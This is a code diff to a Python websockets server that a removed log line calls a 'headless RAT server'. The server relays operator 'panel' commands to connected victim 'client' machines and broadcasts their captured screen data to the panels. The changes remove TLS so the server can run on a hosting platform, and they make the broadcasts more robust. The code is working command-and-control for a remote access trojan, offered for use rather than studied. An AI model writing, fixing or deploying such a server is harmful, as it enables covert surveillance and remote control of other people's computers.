@@ -1,7 +1,5 @@
 import asyncio
 import websockets
-import ssl
-import pathlib
 import json
 import os
 
@@ -20,8 +18,10 @@ async def broadcast_client_list():
     
     list_payload = json.dumps({"type": "client_list", "clients": client_list})
     
-    # Use asyncio.gather to send to all panels concurrently
-    await asyncio.gather(*[panel.send(list_payload) for panel in CONNECTED_PANELS])
+    # Use a copy of the list to prevent issues if a panel disconnects during broadcast
+    panels = list(CONNECTED_PANELS)
+    if panels:
+        await asyncio.gather(*[panel.send(list_payload) for panel in panels])
 
 async def route_message(websocket, initial_data):
     """Main message routing loop after a party has been identified."""
@@ -34,22 +34,18 @@ async def route_message(websocket, initial_data):
             data = json.loads(message)
 
             if role == "panel":
-                # Panel is sending a command for a specific client
                 target_client_id = data.get("target_id")
                 if target_client_id and target_client_id in CONNECTED_CLIENTS:
                     await CONNECTED_CLIENTS[target_client_id]["ws"].send(json.dumps(data))
 
             elif role == "client":
-                # Client is sending screen data, broadcast to all panels
                 payload = json.dumps({
-                    "type": "screen_data",
-                    "session_id": client_id,
-                    "data": data.get("data"),
-                    "width": data.get("width"),
-                    "height": data.get("height")
+                    "type": "screen_data", "session_id": client_id,
+                    "data": data.get("data"), "width": data.get("width"), "height": data.get("height")
                 })
-                if CONNECTED_PANELS:
-                    await asyncio.gather(*[panel.send(payload) for panel in CONNECTED_PANELS])
+                panels = list(CONNECTED_PANELS)
+                if panels:
+                    await asyncio.gather(*[panel.send(payload) for panel in panels])
 
     except websockets.ConnectionClosed:
         print(f"[!] {role.capitalize()} '{client_id}' disconnected.")
@@ -76,9 +72,6 @@ async def handler(websocket, path):
             await broadcast_client_list()
             await route_message(websocket, initial_data)
         
-        else:
-            await websocket.close(1011, "Unknown role.")
-
     finally:
         if initial_data:
             role = initial_data.get("role")
@@ -93,22 +86,14 @@ async def handler(websocket, path):
                     await broadcast_client_list()
 
 async def main():
-    secret_path = pathlib.Path("/etc/secrets/")
-    local_path = pathlib.Path(__file__).with_name("certs")
-    if secret_path.exists() and (secret_path / "cert.pem").exists():
-        certfile, keyfile = secret_path / "cert.pem", secret_path / "key.pem"
-    else:
-        certfile, keyfile = local_path / "cert.pem", local_path / "key.pem"
-    try:
-        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        ssl_context.load_cert_chain(certfile, keyfile)
-    except FileNotFoundError:
-        print(f"[!!!] FATAL ERROR: Certificate files not found.")
-        return
+    # Render assigns the port dynamically and handles SSL. We run an unencrypted server.
     host = "0.0.0.0"
     port = int(os.environ.get("PORT", 8765))
-    print(f"[*] Starting headless RAT server on wss://{host}:{port}")
-    async with websockets.serve(handler, host, port, ssl=ssl_context, max_size=None):
+    
+    print(f"[*] Starting plain WebSocket server on ws://{host}:{port}")
+    # ### THIS IS THE FIX ###
+    # We remove the `ssl=ssl_context` argument from the serve function.
+    async with websockets.serve(handler, host, port, max_size=None):
         await asyncio.Future()
 
 if __name__ == "__main__":
